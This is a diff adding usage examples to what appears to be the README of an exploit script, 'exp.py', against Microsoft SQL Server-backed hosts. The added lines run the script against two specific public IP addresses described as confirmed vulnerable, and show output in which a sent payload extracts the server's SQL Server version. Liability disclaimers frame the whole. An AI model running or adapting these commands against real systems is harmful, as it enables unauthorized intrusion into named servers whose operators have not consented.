@@ -62,3 +62,21 @@ The following instances have been confirmed vulnerable during security testing:
 > **Note:** These IP addresses are provided for reference purposes only. Do not test without proper authorization. Unauthorized access is illegal.
 
 
+# With port
+python exp.py -u 47.115.8.206:8081
+
+# Default port (80)
+python exp.py -u 111.53.134.165
+
+$ python exp.py -u 47.115.8.206:8081
+
+[*] Target: 47.115.8.206:8081
+[*] Sending payload...
+
+[+] MSSQL Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
+
+
+
+This tool is for authorized security testing and educational purposes only.
+Unauthorized use against systems without explicit permission is illegal.
+The author assumes no responsibility for any misuse or damage caused.
